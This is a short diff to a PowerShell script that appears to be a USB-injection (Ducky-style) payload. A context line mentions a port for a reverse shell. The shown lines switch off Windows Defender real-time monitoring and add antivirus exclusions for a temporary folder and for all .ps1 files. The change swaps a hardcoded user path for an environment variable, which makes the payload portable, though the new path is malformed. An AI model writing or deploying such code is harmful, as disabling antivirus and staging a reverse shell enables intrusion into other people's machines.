@@ -11,14 +11,14 @@ $PORT = 'YOUR_PORT'            # Port to use for the reverse shell
 
 
 
-$duckletter = "C:\Users\Noah\Downloads\tmp"
+$duckletter = "C:\Users\$env:USERPROFILE\Downloads\tmp"
 Set-Location $duckletter
 
 Set-MpPreference -DisableRealtimeMonitoring $true
 Add-MpPreference -ExclusionPath "${duckletter}\"
 Set-MpPreference -ExclusionExtension "ps1"
 
-$destDir = "C:\Users\Noah\Downloads\tmp"
+$destDir = "C:\Users\$env:USERPROFILE\Downloads\tmp"
 if (-Not (Test-Path $destDir)) {
     New-Item -ItemType Directory -Path $destDir
 }
